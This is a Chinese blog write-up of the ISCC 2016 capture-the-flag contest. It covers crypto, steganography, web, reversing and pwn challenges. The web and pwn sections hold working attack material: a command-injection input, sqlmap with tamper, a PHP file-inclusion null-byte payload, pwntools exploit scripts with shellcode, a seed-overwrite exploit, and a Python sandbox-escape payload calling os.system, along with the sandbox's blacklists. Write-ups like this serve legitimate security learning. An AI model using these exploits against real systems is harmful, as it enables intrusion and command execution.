---
title: ISCC 2016 writeup (部分题解)
date: 2016-05-25 15:02:13
permalink: iscc-2016-ctf-writeup
tags: 
  - ctf
  - iscc
desc: iscc 2016 ctf 比赛
categories: 
  - ctf
---

### Basic50 Find to me
------

> 已知仿射加密变换为c=（11m+8）mod26，试对密文sjoyuxzr解密

看这篇文章就能弄懂 [http://bbs.pediy.com/showthread.php?t=89299](http://bbs.pediy.com/showthread.php?t=89299)

`flag: itksuzlp`


### Basic50 好长的字符串
------

```
Vm0wd2QyVkhVWGhVYmxKV1YwZDRXRmxVUm5kVlJscHpXa2M1
VjFKdGVGWlZNbmhQWVd4YWMxZHViRmROYWxaeVdWZDRZV01
4WkhGU2JIQk9VbTVDZVZkV1pEUlRNazE0Vkc1T2FWSnVRazlWY
WtwdlZWWmtWMWt6YUZSTlZUVkpWbTEwYzJGV1NuVlJiR2hYWW
xSV1JGcFdXbXRXTVZwMFpFWlNUbFp1UWpaV2Fra3hVakZaZVZO
cmJGSmlWR3hXVm01d1IyUldjRmhsUjBacVZtczFNVmt3WkRSVk1ER
kZWbXBXVjFKc2NGaFdha3BIVTBaYWRWSnNTbGRTTTAwMQ==
```

多次解 base64 即可

`flag: goodluckiscc`

<!-- more -->


### Basic50 明察秋毫
------

查看网页源码，得到 `maybe not flag : Jr1p0zr2VfPp` 看似 `rot13`，解得

`flag: We1c0me2IsCc`


### Basic100 心灵鸡汤
-------

比较简单的逆向，可以发现加上参数 `ISCC`会有不同的结果

![](/media/14630355493646/14630408344746.jpg)

想了很久不知道是什么加密方式。。。后面别人提醒才知道是培根加密,有两个加密表，有个解出来是对的

`flag: HACKERISCC`


### Basic100 小伟的密码
-------

这道题有点运气。。。我做题时没windows系统，都是在mac下面看的题目，结果能直接看见隐藏的文件。。。

![](/media/14630355493646/14630411373281.jpg)

后面我发现在windows上这些文件是隐藏的

`flag: ImnrelnaSicoftethgoicynyrouTo`

### Baisc200 JJ
------

![](/media/14630355493646/14630414489708.jpg)


js fuck.解码得到一个百度云链接，下载下来

![](/media/14630355493646/14630414948583.jpg)

第一次看到这个，根据题目描述的 JJ ，google 发现是 jjencode， github上找了个 jjdecode 脚本，解出来，注意要把匿名函数最后返回的 `return p` 替换成 `return d`

`flag: 34be5bcb6c6f0bcfc628d9e390d13ba6`


### Misc150 一切都在
------

分析网络请求，发现有个图片的请求，提取数据得到一个图片

![](/media/14630355493646/14630416667438.jpg)


### Misc200 Music Never Sleep
------

mp3文件写隐，一直没头绪，`strings + grep` 一阵乱搜也没什么，用Audacity看了也没看出什么来。后面才知道是 mp3stego[http://www.petitcolas.net/steganography/mp3stego/](http://www.petitcolas.net/steganography/mp3stego/), 根据页面example发现需要密码，重新搜关键词 `iscc`

![](/media/14630355493646/14635423380419.jpg)

解密后得到文件 `iscc2016.mp3.txt`:

```
Flag is SkYzWEk0M1JOWlNHWTJTRktKUkdJTVpXRzVSV0U2REdHTVpHT1pZPQ== ???
```

一次`base64` 一次`base32`

`flag: IwtsqndljERbd367cbxf32gg`


### Misc300 毕业论文
------

这道题真的是考脑洞。。。刚开始一直以为会在图片上做文章，后面发现完全不是这样，这个今年的zctf有相似的题，见[http://www.freebuf.com/articles/web/94444.html](http://www.freebuf.com/articles/web/94444.html)

将doc另存为xml

```python
import  xml.dom.minidom
import sys
reload(sys)
sys.setdefaultencoding('gbk')
dom = xml.dom.minidom.parse('them.xml')
root = dom.documentElement
str1 = ''
bb = root.getElementsByTagName('w:spacing')
b= bb[10]
b1 = b.getAttribute("w:val")
print b1
for k in range(10,len(bb)):
    if bb[k].getAttribute("w:val") == "2" :
        str1 += '1' * len(str(bb[k].parentNode.parentNode.getElementsByTagName('w:t')[0].childNodes[0].data).decode('gbk'))
    elif bb[k].getAttribute("w:val") == "-2" :
        str1 += '0' * len(str(bb[k].parentNode.parentNode.getElementsByTagName('w:t')[0].childNodes[0].data).decode('gbk'))
print str1
print len(str1)
#print len(bb)
```

跑出来发现01总共135位，不是偶数位。先转ASCII，发现有`}`符号，手工在最前面补了个0得到`lag{0h-Mj_The8i8}`，看来脚本少统计了个，不过不影响

故：`flag{0h-Mj_The8i8}`



### web150 flag in flag
------

![](/media/14630355493646/14630388492254.jpg)

查看题目给的源码，发现存在注入，上 `sqlmap`，得到flag

![](/media/14630355493646/14630393075941.jpg)



### web300 PING出事了吧
---------

访问 `http://101.200.145.44/web2/` 一看感觉像是shell 命令拼接

![](/media/14630355493646/14630380964753.jpg)

试了 "$", "|" 等一些字符，全部提示输入格式错误，实在没思路了，手贱在网址后面加`.bak` ，`.txt` 意外发现存在 `http://101.200.145.44/web2/index.php.txt`，应该是`index.php` 的源码，看了下正则，构造 `127.0.0.1&&dir` 得到文件列表

![](/media/14630355493646/14630383833367.jpg)

继续使用`dir` 发现 `flag.php`文件。之后犯傻了，在源码里发现文件包含，想到用文件包含去读flag，`http://101.200.145.44/web2/index.php?file=1C9976C230DA289C1C359CD2A7C02D48/flag.php`

 ![](/media/14630355493646/14630384726958.jpg)

结果得到flag了。

![](/media/14630355493646/14630385386141.jpg)

但是提交就是不对，开始怀疑它是不是又加密了。。。后面直接访问 `http://101.200.145.44/web2/1C9976C230DA289C1C359CD2A7C02D48/flag.php` 得到了另一个完全不一样的flag.....

![](/media/14630355493646/14630386203749.jpg)

这个才是最终的flag。这个源码给的提示，我服！

### Web350 simple injection
------

直接是一个登录页面，看题目，像是sql注入，试了一下发现`username`存在注入，但是按照平常的用sqlmap一直跑的话会一直500错误，感觉需要处理一下payload，后面才知道应该使用sqlmap的tamper。先用`burpsuite`导出post提交的内容，然后结合sqlmap:

```
python sqlmap.py -r iscc.txt --tamper space2comment
```

![](/media/14630355493646/14635946016495.jpg)

得到帐号信息，md5解密为`yinquesiting`,登录后等到flag:

`flag{51f52db9-5304-4dcf-acb1-6b0ec2e167f2}`


### Web350 double kill
------

看见url里面出现了`page=submit`和`page=view`立马想到了文件包含。自己还能上传图片，应该去包含自己的图片干一些事情。图片是以上传的时间戳加后缀保存的，包含的时间直接加路径不行，需要加上`%00`截断。

```
http://101.200.145.44/web5/index.php?page=uploads/1463714491.jpg%00
```

先直接加`<?php phpinfo(); ?>`，结果回显是`you can do this`, 可能加上了过滤，换另一种写法 `<script language="php"> phpinfo(); </script>`，直接就回显flag了。。。好吧。。。

![](/media/14630355493646/14639870445888.jpg)


其实还有更鸡贼的做法，服务器上传了图片后，它是没删除图片的，你可以根据前面解题人的时间，往前推一个小时，遍历这个小时内的所有图片，然后再包含看看，就能得到flag。不知道`1463714491.jpg`是哪位大神上传的。。。我直接找了这个图片通过了0_o


### Reverse150 Help me
------

下载附近，扔进IDA，简单看下，就是输入一个数字看是不是符合要求，如果正确则会给出：`Thanks for your key, now here is what you want : {flag}`， 逆向算法自己不会。。。只有简单爆破了

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from subprocess import Popen
from subprocess import PIPE


for i in xrange(999999999, 1, -1):
    p = Popen(['./difficult'], stdin=PIPE, stdout=PIPE)
    output, err = p.communicate(input=str(i))
    if 'Thanks' in output:
        print output
        print i
    break
```

猜测是应该是比较大的数，所以倒着跑数字

`Thanks for your key, now here is what you want : ISCC{n0t_5o-diffic1u7}`

### Reverse150 仪式
------

![](/media/14630355493646/14640888832453.jpg)

![](/media/14630355493646/14640890393410.jpg)


IDA分析，定位到函数`sub_402860`，函数`sub_41CBE4`是获取输入框字符的，分别将`username`和`password`赋值给`String`和 数组`v8`， 直接能看出`username`为`WelcomeToISCC`，密码需要转换下，得到`IsInteresting`。其它是一些验证的，没仔细看了。结果在输入后点`GetFlag`没反应，题目描述说的是需要一些仪式，猜测是需要点击那四个尖角符号，瞎点一通就出flag了

![](/media/14630355493646/14640946135162.jpg)

`flag: {IItrsiWell}`


### Pwn100
------
第一次做逆向题，很多都是在`Shrek_wzw`指点下完成的。

先静态分析：

![](/media/14630355493646/14636452830598.jpg)


可以看出这个pwn本身很简单，`dword_804A160` 是一个函数指针，在得到用户输入后，执行该函数。

![](/media/14630355493646/14636455848196.jpg)


输入的字符串是存到`0x804A060`地址开始的，而在 `call eax` 的时候是将 `0x804A160` 开始的4个字节放到 `eax` 里面，再调用函数的。所以最后的`payload`应该是 `'A'*0x100 + shellcode起始地址 + shellcode`

这个需要注意的是`scanf`会对某些字符进行截断操作，所以shellcode要么encode一下，要么把产生截断字符的语句换成相等的其他语句。encode可以使用 Alpha3 进行编码。

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8

from pwn import *


r = remote('101.200.187.112', 9004)

shellcode = 'hffffk4diFkTpj02Tpk0T0AuEE0t3i4C3B3I7o2r1k0m7L2Z1o177M2p0X154y4N3j8L02'

print r.recv()
r.sendline('A' * 0x100 + p32(0x804a164) + shellcode)
r.sendline('cat flag')
print r.recv()

# r.interactive()
```


### Pwn250 guess
------

有个相似的题目 [https://www.securifera.com/blog/2015/09/09/mmactf-2015-rock-paper-scissors-rps/](https://www.securifera.com/blog/2015/09/09/mmactf-2015-rock-paper-scissors-rps/)

![](/media/14630355493646/14637168641692.jpg)

分析代码，程序先用`time(0)`作为随机种子，然后需要猜测每次生成的随机数，如果连续猜对100次，就能得到flag。

![](/media/14630355493646/14637166964214.jpg)

仔细看代码，随机种子在初始化之后，并不是马上就执行`srand(seed)`的，而是等待用户输入用户名之后才执行的，而对用户名却没有长度限制，那么我们可以输入一定长度的`name`来覆盖程序生成的`seed`。因为`rand()`本身是一个伪随机函数，当每次的`seed`的相同时，生成的随机数也是一样的。

上脚本:

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
from pwn import *
from ctypes import *


libc = CDLL("libc.so.6")
libc.srand(0x01010101)


def get_next_answer():
    seed = libc.rand()
    libc.srand(seed)
    n = libc.rand() % 0x1869F + 1
    return n

r = remote('101.200.187.112', 9001)
print r.recv()
name = 'A' * 0x28 + '\x01' * 4

r.sendline(name)
for i in range(100):
    n = get_next_answer()
    print r.recv()
    print 'Sending: ' + str(n) + '\n'
    r.sendline(str(n))
    print r.recv()


print r.recv()
r.close()
```

`flag: {1a28e5ea63f246745db921f924f3cf4b}`


### Pwn300 pycalc
------

一道python  sandbox 绕过的题目，相似ctf题都是用的`warnings.catch_warnings.__enter__.__func__.__globals__['linecache'].checkcache.__globals__['os']
`这个来绕过，这个题在这里有限制。直接题目给的`__builtins__`其实是有限制的，需要从其它模块中得到`__builtins__`

payload:

```python
### 59 是 warnings.catch_warnings 在list里的索引位置
getattr(().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('o'+'s'), 's'+'yst'+'em')('ls')
```

![](/media/14630355493646/14638106824527.jpg)

![](/media/14630355493646/14638107053955.jpg)


`flag{a23c60c8f9199ead4962705c7191fe3c}`


可以再研究下它的原始脚本

```python
#!/usr/bin/env python2
# -*- coding:utf-8 -*-

def banner():
    print "============================================="
    print "   Simple calculator implemented by python   "
    print "============================================="
    return

def getexp():
    return raw_input(">>> ")

def _hook_import_(name, *args, **kwargs):
    module_blacklist = ['os', 'sys', 'time', 'bdb', 'bsddb', 'cgi',
            'CGIHTTPServer', 'cgitb', 'compileall', 'ctypes', 'dircache',
            'doctest', 'dumbdbm', 'filecmp', 'fileinput', 'ftplib', 'gzip',
            'getopt', 'getpass', 'gettext', 'httplib', 'importlib', 'imputil',
            'linecache', 'macpath', 'mailbox', 'mailcap', 'mhlib', 'mimetools',
            'mimetypes', 'modulefinder', 'multiprocessing', 'netrc', 'new',
            'optparse', 'pdb', 'pipes', 'pkgutil', 'platform', 'popen2', 'poplib',
            'posix', 'posixfile', 'profile', 'pstats', 'pty', 'py_compile',
            'pyclbr', 'pydoc', 'rexec', 'runpy', 'shlex', 'shutil', 'SimpleHTTPServer',
            'SimpleXMLRPCServer', 'site', 'smtpd', 'socket', 'SocketServer',
            'subprocess', 'sysconfig', 'tabnanny', 'tarfile', 'telnetlib',
            'tempfile', 'Tix', 'trace', 'turtle', 'urllib', 'urllib2',
            'user', 'uu', 'webbrowser', 'whichdb', 'zipfile', 'zipimport']
    for forbid in module_blacklist:
        if name == forbid:        # don't let user import these modules
            raise RuntimeError('No you can\' import {0}!!!'.format(forbid))
    return __import__(name, *args, **kwargs)    # normal modules can be imported

def sandbox_filter(command):
    blacklist = ['exec', 'sh', '__getitem__', '__setitem__', '=', 'open', 'read', 'sys', ';', 'os']
    for forbid in blacklist:
        if forbid in command:   return 0
    return 1

def sandbox_exec(command):      # sandbox user input
    result = 0
    __sandboxed_builtins__ = dict(__builtins__.__dict__)
    __sandboxed_builtins__['__import__'] = _hook_import_    # hook import
    del __sandboxed_builtins__['open']
    _global = {
        '__builtins__' : __sandboxed_builtins__
    }
    if sandbox_filter(command) == 0:
        print 'Malicious user input detected!!!'
        exit(0)
    command = 'result = ' + command
    try:
        exec command in _global     # do calculate in a sandboxed environment
    except Exception, e:
        print e
        return 0
    result = _global['result']  # extract the result
    return result

banner()
while 1:
    command = getexp()
    print sandbox_exec(command)
```

和做题时猜想的一直，它自己构造了一个有限制的`__builtins__`变量，导致很多模块和相应的属性不能访问


